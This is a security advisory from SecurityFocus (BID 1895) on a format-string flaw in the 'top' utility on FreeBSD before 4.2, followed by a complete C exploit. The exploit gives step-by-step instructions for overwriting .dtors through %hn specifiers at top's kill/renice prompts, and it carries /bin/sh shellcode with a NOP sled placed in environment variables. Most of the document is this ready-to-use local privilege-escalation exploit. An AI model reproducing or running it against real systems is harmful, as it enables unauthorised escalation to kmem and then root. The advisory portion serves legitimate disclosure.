source: http://www.securityfocus.com/bid/1895/info

top is a program used to display system usage statistics in real time written by GoupSys Consulting but shipped by default as a core component with many operating systems. On BSD systems, top is installed setgid kmem so that it may read process information from kernel memory if executed by a user who does not have that privilege.

top contains a format-string vulnerability that may lead to a compromise of effective groupid kmem on BSD systems (or similar privileges on other systems). The problem occurs in the printing of error messages to a users terminal. A string partially composed of user input (the error message) is passed to a printf() function as the format string argument, allowing malicious format specifiers in user input to corrupt stack variables and execute arbitrary code.

If a malicious user gains egid kmem, vital information can be read from the kernel memory that may lead to a further elevation of privileges (most certainly root eventually). 

The versions of top that ships with FreeBSD prior to 4.2 are known to be vulnerable. It is likely that other systems are vulnerable (though none are confirmed yet).

/*
 * freebsd x86 top exploit
 * affected under top-3.5beta9 ( including this version )
 *
 * 1. get the address of .dtors from /usr/bin/top using objdump ,
 *
 *  'objdump -s -j .dtors /usr/bin/top'
 *
 * 2. divide it into four parts, and set it up into an environment variable like "XSEO="
 *
 * 3. run top, then find "your parted addresses from "kill" or "renice" command like this
 *
 *  'k %200$p' or 'r 2000 %200$p'
 *
 * 4. do exploit !
 *
 *  'k %190u%230$hn' <== 0xbf (4)
 *  'k %190u%229$hn' <== 0xbf (3)
 *  'k %214u%228$hn' <== 0xd7 (2)
 *  'k %118u%227$hn' <== 0x77 (1)
 *
 * truefinder , seo@igrus.inha.ac.kr
 * thx  mat, labman, zen-parse
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90
#define BUFSIZE 2048

char fmt[]=
"XSEO="
/* you would meet above things from 'k %200$p', it's confirming strings*/
"SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
/* .dtors's address in BSD*/
"\x08\xff\x04\x08"
"\x09\xff\x04\x08"
"\x0a\xff\x04\x08"
"\x0b\xff\x04\x08"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

/* might shellcode be located 0xbfbfd6? ~ 0xbfbfde? */

char sc[]=
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
"\xb0\x3b\x50\xcd\x80"; /* bigwaks 23 bytes shellcode */

int
main(void)
{
        char scbuf[BUFSIZE];
        char *scp;

        scp = (char*)scbuf;
        memset( scbuf, NOP, BUFSIZE );

        scp += ( BUFSIZE - strlen(sc) - 1);
        memcpy( scp, sc ,strlen(sc));

        scbuf[ BUFSIZE - 1] = '\0';

        memcpy( scbuf, "EGG=", 4);

        putenv(fmt);
        putenv(scbuf);

        system("/bin/bash");
}